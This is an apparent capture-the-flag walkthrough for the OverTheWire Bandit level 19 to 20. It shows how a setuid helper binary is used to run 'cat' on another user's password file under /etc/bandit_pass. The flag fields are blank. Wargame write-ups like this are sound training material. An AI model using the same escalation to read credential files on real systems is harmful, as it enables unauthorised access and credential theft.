## Introduction

Greetings, Welcome back to the OverTheWire Bandit challenges. In this level, we are presented with a custom binary that has to be exploited to get secret information.

## Previous Flag

In the previous challenge, we successfully acquired the following flag:

Flag:

```

```

### Exploring bandit20-do

Our next task involves the execution of the `./bandit20-do` command. Let's initiate it and see what it does:

```bash
./bandit20-do
```

It seems like this binary executes whatever bash command we provide as the user we want to escalate to, bandit20.

### Retrieving Bandit20 Password

Now that we have access to `bandit20-do`, let's utilize it to read the contents of the `/etc/bandit_pass/bandit20` file:

```bash
./bandit20-do cat /etc/bandit_pass/bandit20
```

Executing this command should reveal the password for the Bandit level 20. 

Flag:
